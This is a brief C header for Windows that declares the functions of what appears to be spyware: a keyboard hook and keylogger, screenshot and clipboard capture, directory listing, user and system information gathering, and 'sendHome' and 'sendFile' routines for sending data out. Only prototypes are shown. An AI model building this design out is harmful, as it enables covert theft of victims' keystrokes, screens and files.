#include <Windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <stdio.h>

#pragma warning(disable:4996) 
#define DIV 10737418

PBITMAPINFO createBitmapInfo(HBITMAP);
LRESULT CALLBACK keyboardHook(int, WPARAM, LPARAM);

int listDir(STRSAFE_LPCWSTR, STRSAFE_LPCWSTR, STRSAFE_LPCWSTR, int);
int list();
int sendHome(char*, int);
int createBMPFile(LPTSTR, PBITMAPINFO, HBITMAP, HDC);
int clipboard();
int getUserInfo();
int getMemoryUsage();
int getSystemInfo();
int keylogger();
int screenshot();
int getIntel();
int sendFile();